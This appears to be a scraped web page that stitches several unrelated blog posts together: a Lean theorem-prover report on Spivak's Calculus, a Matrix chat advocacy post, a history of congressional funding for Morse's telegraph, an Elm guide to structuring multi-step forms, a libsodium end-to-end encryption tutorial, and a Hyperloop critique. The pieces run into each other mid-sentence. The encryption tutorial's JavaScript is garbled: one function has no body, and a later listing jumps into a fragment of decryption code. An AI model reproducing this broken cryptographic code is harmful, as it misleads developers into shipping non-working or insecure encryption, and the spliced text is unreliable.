not translate easily to Lean. I had to learn to “summon” values, adding zero,
then opposite, or multiplying by one, then inverse.</li>
<li>Represent sequences with inductively defined functions (gizmo).</li>
<li>A lot of function names to memorize</li>
<li>I somehow find some facts easier to grasp through induction rules:
<ul>
<li><code>choose k n = choose k-1 n-1 + choose k n-1</code></li>
<li><code>n! = n * (n-1)!</code></li>
</ul>
</li>
<li>I had to figure out big operators and how to use finite sets (<code>finset</code>)</li>
<li>For problem 4, I had to figure out casts and
<code>rwa</code>, <code>simpa</code>. Do the computable parts with integers, then cast to reals to
work with square roots. Computations with real numbers were a pain at first,
since they are not computable: you need to cast to something computable, like
rational numbers, to make any progress. <em>Note added later: this was all solved when I learned
about the <a href="https://leanprover-community.github.io/mathlib_docs/tactics.html#norm_num"><code>norm_num</code></a> and <a href="https://leanprover-community.github.io/mathlib_docs/tactics.html#norm_cast"><code>norm_cast</code></a> tactics</em>.</li>
<li><a href="https://leanprover-community.github.io/mathlib_docs/tactics.html#library_search">library_search</a>,
<a href="https://leanprover-community.github.io/mathlib_docs/tactics.html#squeeze_simp%20/%20squeeze_simpa%20/%20squeeze_dsimp%20/%20squeeze_scope">squeeze_simp</a>
are big time-savers and enormously helpful in discovering more of mathlib. One
pattern that works really well when you are looking for the right theorems to
invoke for the next step in your proof, is to write it in the most general way
possible in an example or a helper function, and try <code>library_search</code> on that.</li>
<li>Try <code>#lint</code> — it’s quaint.</li>
</ul>
<p>I’ll stop here now, and focus on solving the problems without worrying about
whether this will make a good blog post.</p>
<hr>
<h2 id="a-few-months-later">A few months later</h2>
<p>Let’s follow up on the experience report, where I wrote down my impressions as I
just started working on the problems from Michael Spivak’s
<a href="https://www.goodreads.com/book/show/328645.Calculus"><em>Calculus</em></a> (3rd ed.) with
the Lean theorem prover.</p>
<p>A few months later, <a href="https://github.com/tomhoule/spivak-calculus/">I finished writing Lean proofs for all the problems in chapter 1</a>.</p>
<p>After the expected period of familiarization with Lean and
mathlib, what I hoped for is what happened: <strong>at this point, for the problems I
am solving, the hard part is the maths, not the theorem prover</strong>.</p>
<h3 id="writing-down-the-problems">Writing down the problems</h3>
<p>Some problems took some thinking to translate from natural language into Lean.
Stating the problem precisely is part of the proof effort.</p>
<p>Take problem 24 (c):</p>
<blockquote>
<p>Let <code>s(a_{1},...,a_{k})</code> be some sum formed from <code>a_{1},...,a_{k}</code>. Show that
$$s(a_{1},…,a_{k}) = a_{1} + … + a_{k}$$</p>
</blockquote>
<p>The “some sum” part is open to interpretation. It could mean different ordering
of the terms, or different precedence. I went with precedence, and wrote the
following proof</p>
<pre><code>-- For any list of lists of sums, show that the sum of the list_sum's is equal
-- to the list_sum of the concatenated lists. This shows the order of
-- additions does not matter.
def part_c : ∀ (sums : list (list ℝ)), list_sum (list.join sums) = sums.foldl running_list_sum 0
| [] := rfl
| (head::tail) := by {
    let consed := list.cons head tail,
    have ih : list_sum (list.join tail) = tail.foldl running_list_sum 0, from part_c tail,
    have left : list_sum …</code></pre></div></div>

            <h4>Using Matrix to replace proprietary and centralized chat apps</h4><p>
            Reading time: 3 minutes.
            </p><p>As you may know it, I am a fervent user of the chat protocol Matrix.
If you don’t know what Matrix is, this is basically a protocol developed by the Matrix Foundation. Matrix is made to be federated, it means that servers implementing correctly the Matrix specification can communicate and therefore, users that are not on the same servers can still talk to each other. Some examples of federation would be with Activitypub (Mastodon) or Usenet.</p>
<blockquote>
<p>But wait Jae, we already have countless other chat apps already, Telegram, Signal and even XMPP which is federated!</p>
</blockquote>
<p>Well, here are the advantages of Matrix over all of those:</p>
<ol>
<li>
<p>Matrix is 100% open-source. As you may know Telegram’s servers are currently closed-source which poses a problem about trust. Nobody can say what the server is doing nor what it is harvesting which could be very dangerous. On the other hand, Signal, XMPP and Matrix are all fully open-source.</p>
</li>
<li>
<p>Matrix isn’t centralized to a single server. Currently, Telegram and Signal are centralized apps which means if the server goes down, everyone else goes down. moxie0 of Signal even wrote a <a href="https://signal.org/blog/the-ecosystem-is-moving/">blog post</a> on ‘why Signal will never have federation’ which is in my opinion a big mistake. XMPP still stands up as it is federated as well and has plenty of server implementations.</p>
</li>
<li>
<p>Matrix has a flagship client which has a great UX. <strong>This</strong> is a big point, as other federated protocols such as XMPP are kinda like a jungle for new users, you are greeted with a list of all clients which you can use and then comes the step where you have to choose your server. Lots of those servers are sometime hard to find, have very spartan UIs or even no web form or easy way to register whatsoever. On the other hand, Matrix has a flagship, <strong>Element</strong>, which is deemed as the ‘official Matrix client’ since it implements the Matrix specification correctly and is made by basically the same people. While other projects would have only done a server, Element made a polished client, focused mainly on the UX in order for people to take the first steps of moving to anything else easier. Even if the UX is still not perfect and some aspects aren’t finished yet, moving to Element will be easier than moving to any other XMPP client.</p>
</li>
</ol>
<p>I have been using Matrix since 2016 now and it has considerably improved over time, coming from “barely usable” to “let’s host my own homeserver”.
Even in its current state, lots of things are to be improved such as communities or custom stickers but everything is on the right way.
From now on, everything can <strong>only improve</strong>, we are seeing new server implementations, new clients, bots, communities moving to Matrix.</p>
<p>Matrix has several other features such as E2EE (end-to-end encryption) which is now enabled by default and bridges which can be used to temporarily bridge a Matrix room and a slack chat for instance.</p>
<p>If you want to give Matrix a try, download <a href="https://element.io/">Element</a> and create an account, it doesn’t even requires an email address!
You can also come and say ‘hello’ in my very own channel <strong>#home:jae.moe</strong> !</p>
<p>That’s all for today,
I’ll see you next time!

As a result, he was given about a million dollars (inflation-adjusted):</p><blockquote><p><a href="http://memory.loc.gov/cgi-bin/ampage?collId=llsl&amp;fileName=005/llsl005.db&amp;recNum=655"><em>(March 3, 1843)</em></a> Be it enacted… That the sum of thirty thousand dollars be… appropriated… for testing the capacity and usefulness of the system of electro-magnetic telegraphs invented by Samuel F. B. Morse… The Secretary of the Treasury [is] authorized to pay… Morse, and the persons employed under him, such sums of money as he may deem to be a fair compensation…</p></blockquote><p>Today, this seems like an astonishingly implausible story — a single person pesters Congress for a massive sum of money, and <em>gets it</em>.</p><p>This was not Morse’s first demonstration to Congress, though. It took him five years to secure funding.</p><p>In 1837, the Secretary of the Treasury (Levi Woodbury) was instructed by the House to investigate the feasibility of constructing a system of telegraphs for the United States. At the time, “telegraph” generally meant “optical telegraph”; the relays in such a system were humans, who watched one signal and then passed it on. When Woodbury called for proposals, though, Morse replied with his electromagnetic telegraph. This was the beginning of his engagement with Congress.</p><p>In 1838 and 1839, both the House and the Senate considered bills to support the development of Morse’s magnetic telegraph. In the Senate, the issue was whether to allow duty-free importation of construction materials; the House considered a bill for testing the practicality of constructing such a system (presumably with an eye towards directly financing it). Morse demonstrated the system, in 1838, to Congress and the President. Nevertheless, neither bill was ever voted on.</p><p>In 1842, Morse convinced Congress to allow him to demonstrate again. I can’t find any claim that Morse’s second demonstration was noticeably more impressive, but in 1843, Congress finally passed an appropriate for Morse and his colleagues.</p><p>Morse reported in 1844 that the line from the District to Baltimore was complete. Side note: “What hath God wrought” was not, in fact, Morse’s first transmission. The first public transmission, according to wikipedia, was “A patient waiter is no loser”. The famous “What hath God wrought” was the opening line for the D.C.-Baltimore line.</p><p>The Congressional Journal over the next decade is filled with references to petitions and bills for funding expansion of the telegraph system across the country. Congress wasn’t just pleased with the telegraph, though. Morse’s demonstration — and the fact that he delivered on his promises — had made him personally popular. In 1845, the House Committee on Public Buildings and Grounds was instructed to ask Morse</p><blockquote><p>if, in his opinion, he can invent or adopt a more expeditious plan of taking the yeas and nays in this hall…</p></blockquote><p>He seems to have declined, as the House didn’t vote electronically <a href="https://history.house.gov/Exhibitions-and-Publications/Electronic-Technology/House-Technology/">until 1973</a>.</p><p>In 1845, Congress approved an expansion of the telegraph system to New York, and began referring to “Professor Morse” instead of “Samuel F. B. Morse”. In the subsequent years, telegraph lines were often built alongside railroads, funded by Congress in the same bill. By 1870 the magnetic telegraph reached California.</p><p>An astonishing journey, beginning with the audacity of an ordinary man to write to Congress for money.</p><h2 id="ii">II.</h2><p>Or not. To start with, Morse was no ordinary man. He was a consumate self-promoter, intensely concerned with his own reputation, and quite politically active.</p><p>Wikipedia discusses his political activites <a href="https://en.wikipedia.org/wiki/Samuel_Morse">at some length</a>. He published a political tract (explaining how the Catholics were conspiring to take over the country) in 1835. He ran for mayor of New York (to fight the “deep Catholic state”, I assume) in 1836. Note the timeline: neither a prelude nor an afterthought, these activites were essentially contemporary with his creation of the telegraph.</p><p>After the telegraph was well established, in the 1850s, Morse turned his attention to the question of slavery, comparing it favorably to employment, parenting, and government.</p><p>In 1871, H.R. 285 was passed, allowing a statue of Morse to be erected on government land. Morse died in 1872, and a memorial service was held in Congress. I’m assuming this service primarily focused on the telegraph, rather than his paintings (<a href="https://en.wikipedia.org/wiki/Samuel_Morse#/media/File:Samuel_Finley_Breeze_Morse_001.jpg">not bad</a>, actually) or his support for slavey (none too popular with Congress during reconstruction, I guess).</p><h2 id="iii">III.</h2><p>Henry Hall Sherwood was a physician in New York. In the 1830s, the electromagnetic nature of the nervous system was still a relatively new discovery, and Sherwood seems to have gotten a bit over-excited. His <a href="https://collections.nlm.nih.gov/?f%5Bdrep2.authorAggregate%5D%5B%5D=Sherwood%2C+H.+H.+%28Henry+Hall%29">books</a> include case studies; for the most part, he seems to have waved magnets near his patients. He claims this cured them of various ailments. I’d laugh, but there’s an accupuncture clinic a couple blocks from my office. I’m afraid to find out whether this was classified an “essential service” during the lockdown.</p><p>Electromagnetism (or as it was often known then, “magnetism” — even when referring to phenomena we would call electric) was all the rage. A major challenge of the age was to understand the structure of the magnetic field of the Earth, although that’s slightly modern terminology — it was often referred to as “the variation of the compass”. This would be helpful, among other things, for navigation at sea: you can easily imagine that a precise model might allow the measurement of longitude. Sherwood, being an expert on the magnetic nature of the nervous system, decided to lend a hand to this closely related problem. Overall, this went about as well as you’d expect.</p><p>Like his better-known contemporary, Sherwood was bold enough to make requests directly of Congress. He petitioned the House, claiming to have invented an instrument (the <em>geometer</em>) for navigation purely from magnetic observations, and</p><blockquote><p>praying the aid of the Government of the United States in the publication of a work to explain the discoveries…</p></blockquote><p>among other things. It was proposed that he give the House a demonstration of his techniques, in June of 1838. This was voted down, and the matter dropped entirely.</p><p>That same month, Sherwood also petitioned the Senate; his petition was presented by <a href="https://en.wikipedia.org/wiki/Nathaniel_P._Tallmadge">Nathaniel Tallmadge</a> of New York. Like the House, on June 21st, the Senate considered and declined the possiblity of a demonstration. Sherwood’s petition was referred to the Committee on Naval Affairs, which submitted a report, presented again by Tallmadge, to the Senate on July 3rd.</p><p>Here it gets interesting. That report caused something of a stir in the scientific community. No less than <a href="https://en.wikipedia.org/wiki/Joseph_Henry">Joseph Henry</a>, soon to become the first Secretary of the Smithsonian Institution, published a denunciation of the report. You can read his article <a href="https://siarchives.si.edu/sites/default/files/pdfs/JHPVol/JHPP_V4_P75-79_Transcript.pdf">here</a>, which was written in protest</p><blockquote><p>against the plan of discussing such subjects in Congress before proper means have been taken to determine their true character.</p></blockquote><p>In other words, against Congressional meddling and speculation. Most of Henry’s complaint is taken up by a somewhat detailed critique (occasionally, mockery) of Sherwood’s theories. The above quote somewhat masks Henry’s true opinion. A few paragraphs later he writes:</p><blockquote><p>we do not believe that there is a person of any scientific reputation in our country, who has paid attention to this subject, who will not immediately say that the whole affair is perfectly peurile…</p></blockquote><p>Despite his earlier words, I don’t get the impression the Henry would object to Congressional support for a speculative endeavor: just not an entirely futile endeavor. After Henry’s rebuttal was published, the Senate seems to have forgotten about Sherwood’s petition for a while.</p><p>Sherwood again requested financial aid from Congress in mid-February, 1839. Another report was delivered by Tallmadge from his committee, but I can find no details on what it said. It must not have been positive: the last reference to H. H. Sherwood in the papers of Congress is on March 2, 1839, when the Committee on Naval Affairs was given permission, by the Senate, to drop the matter.</p><h2 id="iv">IV.</h2><p>It is sometimes argued that Congress’s support of Morse’s telegraph was not the really the first case in which the new government funded science: for a sufficiently broad definition of “science”, that honor belongs to the Lewis and Clark expedition nearly 40 years prior. But just as Morse’s was not the first time the government <em>considered</em> funding science, the 1803 expedition was not the first time the U.S. government <em>considered</em> funding an expedition.</p><p>John Churchman was <a href="https://bostonraremaps.com/inventory/john-churchman-magnetic-atlas/">a surveyor and mapmaker</a>, who in the 1780s became preoccupied with the task of measuring the longitude of a ship at sea via magnetic observations (much like Sherwood!). Churchman, however, was not a complete crank. Like Morse, he was no stranger to make requests of governments, having (for instance) <a href="https://founders.archives.gov/documents/Jefferson/01-11-02-0378">written</a> to Thomas Jefferson in 1787 to request that a paper of his be presented to the Royal Academy of Sciences at Paris. (That puts things in perspective. There’s no excuse for not sending cold emails!)</p><p>In 1791, Churchman made a request of Congress: “praying the patronage of Government to enable him to undertake a voyage” to investigate the magnetic fields near the geomagnetic north pole. Of course, his <em>motivation</em> for this voyage was to confirm a theory of the behavior of magnetic field lines which is now known to be incorrect. In brief, the behavior of magnetic field lines is not as predictable as he assumed, and therefore not as useful for navigation beyond distinguishing north from south.</p><p>Nevertheless, exploratory voyages based on incorrect assumptions were commonplace and often productive, and Congress considered the matter serious — more seriously, in fact, than the Sherwood business. The House held <a href="http://memory.loc.gov/cgi-bin/ampage?collId=llac&amp;fileName=003/llac003.db&amp;recNum=153">a lengthy discussion</a> on 6 Jan 1792 to consider the petition.</p><p>The representatives (at least those who participate in the debate) come across as reasonably knowledgable about the subject. Halley’s (yes, that Halley) …</p></article></div>

    </p>
    <p>Most of my work over the past 10 years has involved writing what is often called a <em>wizard</em>.</p>
<p>A wizard is essentially a multi-step process that guides a user through a particular workflow. For example, if you are installing a new application on your computer, the wizard might guide you through the following process:</p>
<ol type="1">
<li>Enter your license registration details</li>
<li>Agree to the software author’s legal terms</li>
<li>Specify an installation location</li>
</ol>
<p>Most web applications provide something similar. If a user needs to input a large amount of data for the application to then run a bunch of calculations, you could of course just provide the user with one big web form. At a certain size though, a single web form can be intimidating and provide a less than ideal user experience. The canonical way to improve the user experience here is to break up the web form into several separate pages. This is another example of a wizard.</p>
<figure>
<img src="https://jezenthomas.com/static/img/wizard-diagram.jpg" alt="Forms are easier to digest when they’re split into separate steps"><figcaption>Forms are easier to digest when they’re split into separate steps</figcaption>
</figure>
<p>I’ve tried writing wizards in a number of different web technologies, and so far Elm has proven itself as by far the most robust and painless, <em>especially</em> when it inevitably comes to changing some conditional logic to meet the mutable needs of various business processes.</p>
<p>For any small Elm application, project structure is easy. There is no reason why a 1,000 line Elm application can’t live in a single file. In fact this is really how every Elm application ought to begin its life. Start with a single file with the usual boilerplate and the following contents:</p>
<ul>
<li>A single sum type to model all of the messages your application supports</li>
<li>A single model which contains all the application state</li>
<li>A single update function for advancing the application state</li>
<li>A single view function for rendering the application state on the page</li>
</ul>
<p>If your web form is complex enough to warrant being broken into separate pages however, then your application is naturally not going to consist of a small number of lines of code. A common concern among less experienced Elm programmers is that one big sum type for all of your messages becomes unwieldy to maintain. The same is said of having one big shallow record for all of the application state, or one big <code>update</code> function to match all the constructors of the one big <code>Msg</code> type. This is where unnecessary complexity starts to balloon as programmers add <em>clever</em> abstractions and misdirections, usually involving both <code>Html.map</code> and <code>Cmd.map</code>, separate <code>update</code> functions for each logical subsection of your application (usually with noticeably awkward type signatures), and some vague hand-waving in the direction of <em>encapsulation</em> and so-called <em>Clean Code</em>.</p>
<p>I’d argue that this kind of misdirection is almost <em>never</em> what you want. I’d argue further that this applies <em>especially</em> to you if your background is in maintaining complex React/Angular applications, where invented complexity is the status quo and this kind of misdirection is simply what you have become desensitised to.</p>
<p>So if the combination of <code>Html.map</code> and <code>Cmd.map</code> are to be avoided, how can we scale an Elm application without sacrificing developer ergonomics? In short, the tricks to employ are:</p>
<ul>
<li>Nested sum types</li>
<li>Nested record types</li>
<li>Nested update functions</li>
<li>Small, composable view functions</li>
<li>Function composition</li>
<li>Lenses</li>
</ul>
<p>Let’s take a look at a more concrete application of these ideas. As an example, we can model the process of a person applying for a bank loan.</p>
<p>The bank will want to ask the applicant a whole bunch of questions, which we could group into three categories:</p>
<ol type="1">
<li>Personal information</li>
<li>Details on the purpose of the loan</li>
<li>Financial information and creditworthiness</li>
</ol>
<p>This would suggest a three-step wizard or a three-page web form. A reasonable place to begin splitting our application apart into three smaller pieces is in our <code>Msg</code> type.</p>
<h2 id="the-big-msg-type">The Big Msg Type</h2>
<p>The naïve way to model the messages our application should support is with one big sum type, which might look something like this:</p>
<pre><code>type Page
  = PersonalInformationPage
  | LoanPurposePage
  | FinancialDetailsPage

type Msg
  -- System-wide messages
  = NoOp
  | SetPage Page
  -- etc…

  -- Personal information
  | SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- …more messages for the personal information page

  -- Purpose of the loan
  | SetPurchaseItemCategory
  | SetPurchaseItemEstimatedValue
  -- …more messages for the loan purpose page

  -- Financial information
  | SetMonthlyIncomeBeforeTax
  | SetMonthlyRentPayment
  -- …more messages about the applicant's financial details</code></pre>
<p>This <em>does</em> work, but at some point it becomes cumbersome to support a large number of constructors. The value for “large” is of course determined by the individual programmer’s personal taste and/or pain threshold. To ease this pain, people typically <em>extract</em> groups of messages into their own separate sum types, which subsequently forces them to write update functions that return a type <em>other</em> than the top-level <code>Msg</code> type.</p>
<p><em>Don’t do that!</em></p>
<p>The way to break these groups of constructors out is by first nesting them inside the <code>Msg</code> type, like this:</p>
<pre><code>type PersonalInformationMsg
  = SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- etc..

type LoanPurposeMsg -- etc…

type FinancialDetailsMsg -- etc…

type Msg
  = NoOp
  | SetPage Page
  | PersonalInformationMsg PersonalInformationMsg
  | LoanPurposeMsg LoanPurposeMsg
  | FinancialDetailsMsg FinancialDetailsMsg</code></pre>
<p>The new message types can live in the same file as the top-level <code>Msg</code> type. They can also be extracted to different files. That’s your choice.</p>
<p>The next thing to tackle is our <code>update</code> function, since it needs to mirror our <code>Msg</code> type.</p>
<h2 id="nested-update-functions">Nested Update Functions</h2>
<p>I’ve seen people advocate for page-specific <code>update</code> functions which take a page-specific model and return a tuple of that page-specific model and a page-specific <code>Cmd Msg</code> equivalent. This is typically where you see <code>Cmd.map</code> sneaking in. These functions almost inevitably end up needing <em>something</em> from the top-level application-wide state, so you’ll often see some type signature like this:</p>
<pre><code>updatePersonalInformation
   : PersonalInformationMsg
  -&gt; Model
  -&gt; (PersonalInformationModel, Cmd PersonalInformationMsg)
  -&gt; (Model, Cmd Msg)</code></pre>
<p>This is <em>way</em> too complex already, and this approach doesn’t even actually buy you anything.</p>
<p>The far simpler way to do this is to have every nested <code>update</code> function take a page-specific message, the <em>entire</em> application state, and return the same type for that state along with the top-level <code>Msg</code> type, like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName a    -&gt; -- …
  SetLastName a     -&gt; -- …
  SetAddressLine1 a -&gt; -- …
  -- etc…

update : Msg -&gt; Model -&gt; (Model, Cmd Msg)
update msg model = case msg of
  NoOp -&gt; (model, Cmd.none)
  SetPage page -&gt; ({ model | page = page }, Cmd.none)
  PersonalInformationMsg subMsg -&gt; updatePersonalInformation subMsg model
  LoanPurposeMsg subMsg -&gt; updateLoanPurpose subMsg model
  FinancialDetailsMsg subMsg -&gt; updateFinancialDetails subMsg model</code></pre>
<p>No complicated type signatures. No juggling of message types. No <code>Cmd.map</code>. Easy.</p>
<p>Of course the whole point of our <code>update</code> function is to advance the state of our model, and the structure of that model is also something that can swell and become unwieldy, so that’s what we will dissect next.</p>
<h2 id="record-surgery">Record Surgery</h2>
<p>Near the inception of the project, all of our individual bits of state might exist at the top level of our <code>Model</code>, which is typically represented as a record. Perhaps something like this:</p>
<pre><code>type alias Model =
  { page : Page
  , firstName : String
  , lastName : String
  , addressLine1 : String
  -- …more personal information fields

  , purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …more loan purpose fields…

  -- …and also financial details, and system-wide state, etc…
  }</code></pre>
<p>Like the parts of our project we’ve addressed previously, this also can turn into a bit of a mess as it grows. Both application-wide data and page-specific data are mixed in together which feels a bit haphazard. Fortunately, grouping and extracting these fields is typically rather intuitive. We can start by grouping page-specific parts of the state together, and then group further until it no longer <em>feels</em> messy.</p>
<pre><code>type alias Address =
  { line1 : String
  , line2 : String
  , city : String
  , postcode : String
  -- …
  }

type alias PersonalInformation =
  { firstName : String
  , lastName : String
  , address : Address
  -- …
  }

type alias LoanPurpose =
  { purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …
  }

type alias FinancialDetails = -- …

type alias Model =
  { page : Page
  , personalInformation : PersonalInformation
  , loanPurpose : LoanPurpose
  , financialDetails : FinancialDetails
  }</code></pre>
<p>The problem now however is that when we wish to update a deeply-nested field, we need to write all of the code to unwrap each level until we arrive at the depth we need. Illustrated another way, let’s say we want to update the first line of the applicant’s address.</p>
<p>Retrieving the value of this field is no problem, as we can use Elm’s dot syntax to succinctly get us all the way there, like this:</p>
<pre><code>model.personalInformation.address.line1</code></pre>
<p>What we <em>can’t</em> do here however is <em>update</em> that field in a similar fashion, <em>i.e.</em>, Elm won’t allow us to write something like this:</p>
<pre><code>-- This won't work
{ model.personalInformation.address | line1 = newLine1 }

-- This also won't work
{ model | personalInformation.address.line1 = newLine1 }</code></pre>
<p>The naïve way to unwrap and subsequently update the field in this record is to write something like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName _ -&gt; -- …

  SetLastName _ -&gt; -- …

  SetAddressLine1 newLine1 -&gt;
    let
        …</code></pre></article></div></div>

<p>Governments are back on their anti-encryption bullshit again.</p>



<p>Between the <a href="https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/">U.S. Senate’s “EARN IT” Act</a>, the <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">E.U.’s slew of anti-encryption proposals</a>, and <a href="https://fee.org/articles/australia-s-unprecedented-encryption-law-is-a-threat-to-global-privacy/">Australia’s new anti-encryption law</a>, it’s become clear that the authoritarians in office view online privacy as a threat to their existence.</p>



<p>Normally, when the governments increase their anti-privacy sabre-rattling, technologists start talking more loudly about Tor, Signal, and other privacy technologies (usually only to be drowned out by paranoid people who think Tor and Signal are government backdoors or something stupid; conspiracy theories ruin everything!).</p>



<p><strong>I’m not going to do that.</strong></p>



<p>Instead, I’m going to show you how to add end-to-end encryption to any communication software you’re developing. (Hopefully, I’ll avoid making <a href="https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/">any bizarre design decisions</a> along the way.)</p>



<p>But first, some important disclaimers:</p>



<ol><li><strong>Yes, you should absolutely do this.</strong> I don’t care how banal your thing is; if you expect people to use it to communicate with each other, you should make it so that you can never decrypt their communications.</li><li>You should absolutely NOT bill the thing you’re developing as an <em>alternative</em> to Signal or WhatsApp.</li><li>The goal of doing this is to increase the amount of end-to-end encryption deployed on the Internet that the service operator cannot decrypt (even if compelled by court order) and make E2EE normalized. The goal is NOT to compete with highly specialized and peer-reviewed privacy technology.</li><li>I am not a lawyer, I’m some furry who works in cryptography. The contents of this blog post is not legal advice, nor is it endorsed by any company or organization. Ask the <a href="https://eff.org/">EFF</a> for legal questions.</li></ol>



<p>The organization of this blog post is as follows: First, I’ll explain <a href="#symmetric-key-encryption">how to encrypt and decrypt data between users</a>, assuming you have a key. Next, I’ll explain <a href="#key-agreement">how to build an authenticated key exchange</a> and <a href="#session-key-management">a ratcheting protocol to determine the keys used in the first step</a>. Afterwards, I’ll explore <a href="#identity-key-management">techniques for binding authentication keys to identities and managing trust</a>. Finally, I’ll discuss <a href="#backdoor-resistance">strategies for making it impractical to ever backdoor your software (and impossible to silently backdoor it)</a>, just to piss <a href="https://en.wikipedia.org/wiki/Five_Eyes">the creeps and tyrants of the world</a> off even more.</p>



<p>You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing.</p>







<h2 id="preliminaries">Preliminaries</h2>



<h3 id="choosing-a-cryptography-library">Choosing a Cryptography Library</h3>



<p>In the examples contained on this page, I will be using the <a href="https://libsodium.gitbook.io/doc/">Sodium cryptography library</a>. Specifically, my example code will be written with the <a href="https://github.com/paragonie/sodium-plus">Sodium-Plus</a> library for JavaScript, since it strikes a good balance between performance and being cross-platform.</p>



<pre><code>const { SodiumPlus } = require('sodium-plus');

(async function() {
     // Select a backend automatically
     const sodium = await SodiumPlus.auto();
     
     // Do other stuff here
})();</code></pre>



<p>Libsodium is <a href="https://latacora.micro.blog/2018/04/03/cryptographic-right-answers.html">generally the correct choice for developing cryptography features in software</a>, and is available in most programming languages,</p>



<p>If you’re prone to choose a different library, you should consult your cryptographer (and yes, you should have one on your payroll if you’re doing things different) about your design choices.</p>



<h3>Threat Modelling</h3>



<p>Remember above when I said, “You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing”?</p>



<p>How far you go in implementing the steps outlined on this blog post should be informed by <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">a threat model</a>, not an ad hoc judgment.</p>



<p>For example, if you’re encrypting user data and storing it in the cloud, you probably want to pass <a href="https://blog.cryptographyengineering.com/2012/04/05/icloud-who-holds-key/">the Mud Puddle Test</a>:</p>



<blockquote><div><p>1. First, drop your device(s) in a mud puddle.<br>2. Next, slip in said puddle and crack yourself on the head. When you regain consciousness you’ll be perfectly fine, but<em>&nbsp;won’t for the life of you&nbsp;</em>be able to&nbsp;recall your device passwords or keys.<br>3. Now try to get your cloud data back.</p><p>Did you succeed? If so, you’re screwed. Or to be a bit less dramatic, I should say: your cloud provider has access to your ‘encrypted’ data, as does the government if they want it, as does any rogue employee who knows their way around your provider’s internal policy checks.</p></div><cite>Matthew Green describes the Mud Puddle Test, which Apple products <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">definitely don’t pass</a>.</cite></blockquote>



<p>If you must fail the Mud Puddle Test for your users, make sure you’re clear and transparent about this in the documentation for your product or service.</p>







<h2 id="symmetric-key-encryption">I. Symmetric-Key Encryption</h2>



<p>The easiest piece of this puzzle is to encrypt data in transit between both ends (thus, satisfying the loosest definition of end-to-end encryption).</p>



<p>At this layer, you already have some kind of symmetric key to use for encrypting data before you send it, and for decrypting it as you receive it.</p>



<p>For example, the following code will encrypt/decrypt strings and return hexadecimal strings with a version prefix.</p>


<pre title="">const VERSION = "v1";

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {

<p>Under-the-hood, this is using <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/#aes-gcm-vs-xchacha20poly1305">XChaCha20-Poly1305</a>, which is less sensitive to timing leaks than AES-GCM. However, like AES-GCM, this encryption mode doesn’t provide <a href="https://eprint.iacr.org/2019/016">message- or key-commitment</a>.</p>



<p>If you want key commitment, you should derive two keys from <code>$key</code> using a KDF based on hash functions: One for actual encryption, and the other <a href="https://eprint.iacr.org/2020/1153">as a key commitment value</a>.</p>



<p>If you want message commitment, you can use AES-CTR + HMAC-SHA256 or XChaCha20 + BLAKE2b-MAC.</p>



<p>If you want both, ask <a href="https://mumble.net/~campbell/">Taylor Campbell</a> about his BLAKE3-based design.</p>



<p>A modified version of the above code with key-commitment might look like this:</p>


<pre title="">const VERSION = "v2";

/**
 * Derive an encryption key and a commitment hash.
 * @param {CryptographyKey} key

    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));

}
</pre>


<p>Another design choice you might make is to encode ciphertext with base64 instead of hexadecimal. That doesn’t significantly alter the design here, but it does mean your decoding logic has to accommodate this.</p>



<p>You SHOULD version your ciphertexts, and include this in the AAD provided to your AEAD encryption mode. I used “v1” and “v2” as a version string above, but you can use your software name for that too.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div id="pico">
<p>Shocking news! In an incredible breakthrough for American mass-transit engineering, the transportation technology company Virgin Hyperloop this past weekend successfully moved two people 500 meters across the barren Las Vegas desert at a top speed of just over 100 mph, setting a new world record for the absolute most pitiful thing anyone not named “Elon Musk” has ever tried to pass off as “high-speed rail.”</p>



<p>Here’s video of the shameful display:</p>



<figure><p>
<iframe title="Watch people travel in Virgin Hyperloop for the first time" width="500" height="281" src="https://www.youtube.com/embed/AZruVz3Ccjk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p></figure>



<p>Virgin Hyperloop, an American company despite the Richard Branson branding, proposes to use a combination of magnetic levitation, or “maglev”—a decades-old technology that has been in commercial operation moving real trains filled with real people in, for example, Shanghai, China, at speeds up to 268 miles per hour, for <em>17 goddamn years</em>—and “vactrain,” a concept design for an enclosed, artificially evacuated tunnel where air resistance may be as low as in the upper parts of Earth’s atmosphere, theoretically allowing for much higher top speeds at much lower levels of energy consumption. It is so goddamn embarrassing to type this. France’s electric TGV system has been in regular commercial operation for nearly 40 years; in April of 2007 one of its trains hit 357 miles per hour in a test.</p>



